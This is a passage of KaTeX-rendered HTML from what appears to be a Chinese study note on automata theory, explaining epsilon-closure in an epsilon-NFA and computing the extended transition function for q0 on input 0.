mathdefault">ϵ</span></span></span></span>路的状态的集合。</p><p>实际上，之前定义里没有说清楚，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon-closure(q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>时包含自己q本身的，因为可以想为自己通过输入的空串转移为了自己，因为这个过程就像什么都没有动一样，所以图里一般应该也不会标。</p><p>然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>很显然在这个空串闭包中，图中都标了，然后这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>应该也算，因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>看起来貌似要经过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">2\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">ϵ</span></span></span></span>的一条路，但是实际上由于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>时一个空串，两个空串和一个空串一样，都是空串，可以和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>=</mo><mn>2</mn><mo>×</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">0=2\times0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>做类比。</p><p>所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\epsilon-closure(q_0)=\{q_0,q_1,q_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></p><p>然后我们再看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>是怎么求的，我们需要利用上面的定义4。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q,wa)=\epsilon-closure(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">{</mo><mi>p</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∃</mi><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=\{p|\exists r\in \hat{\delta}(q,w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">p</span><span class="mord">∣</span><span class="mord">∃</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∈</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">p\in\delta(r,a)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">}</span></span></span></span></p><p>= <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∪</mo><mrow><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>w</mi><mo stretchy="false">)</mo></mrow></msub><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\cup_{r\in\hat{\delta}(q,w)}\delta(r,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.250716em;vertical-align:-0.5007159999999999em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3742840000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mrel mtight">∈</span><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-2.9634400000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5007159999999999em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></p><p>这里把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>看作<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,\epsilon0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mord">0</span><span class="mclose">)</span></span></span></span></p><p>有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{\delta}(q_0,\epsilon0)=\epsilon-closure(P)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy="false">{</mo><mi>p</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∃</mi><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=\{p|\exists r\in \hat{\delta}(q_0,\epsilon)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">p</span><span class="mord">∣</span><span class="mord">∃</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span></span></span></span> 使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∈</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">p\in\delta(r,0)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mclose">}</span></span></span></span></p><p>= <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∪</mo><mrow><mi>r</mi><mo>∈</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">)</mo></mrow></msub><mi>δ</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\cup_{r\in\hat{\delta}(q_0,\epsilon)}\delta(r,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.250716em;vertical-align:-0.5007159999999999em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3742840000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mrel mtight">∈</span><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-2.9634400000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span 